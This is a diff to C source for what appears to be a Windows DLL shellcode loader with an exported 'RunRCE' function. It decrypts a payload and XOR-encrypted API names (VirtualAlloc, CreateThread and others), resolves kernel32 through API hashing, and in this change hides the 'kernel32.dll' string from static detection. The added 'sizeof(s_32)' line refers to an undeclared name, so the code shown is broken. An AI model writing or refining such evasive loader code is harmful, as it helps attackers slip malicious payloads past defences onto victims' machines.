@@ -21,12 +21,15 @@ unsigned char s_ct[] = { };
 unsigned char s_wfso[] = { };
 unsigned char s_rmm[] = { };
 
+unsigned char s_k32[] = { };
+
 unsigned int my_payload_len = sizeof(my_payload);
 unsigned int s_va_len = sizeof(s_va);
 unsigned int s_vp_len = sizeof(s_vp);
 unsigned int s_ct_len = sizeof(s_ct);
 unsigned int s_wfso_len = sizeof(s_wfso);
 unsigned int s_rmm_len = sizeof(s_rmm);
+unsigned int s_k32_len = sizeof(s_32);
 
 // keys
 char my_payload_key[] = "";
@@ -35,6 +38,7 @@ char s_vp_key[] = "";
 char s_ct_key[] = "";
 char s_wfso_key[] = "";
 char s_rmm_key[] = "";
+char s_k32_key[] = "";
 
 typedef struct _UNICODE_STRING {
   USHORT Length;
@@ -193,7 +197,10 @@ __declspec(dllexport) BOOL WINAPI RunRCE(void) {
   HMODULE mod = getKernel32(KERNEL32_HASH);
   pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
   pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);
-  HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
+
+  // decrypt dll name
+  XOR((char *) s_k32, s_k32_len, s_k32_key, sizeof(s_k32_key));
+  HMODULE hk32 = myGetModuleHandleA(s_k32);
 
   // decrypt VirtualAlloc
   XOR((char *) s_va, s_va_len, s_va_key, sizeof(s_va_key));
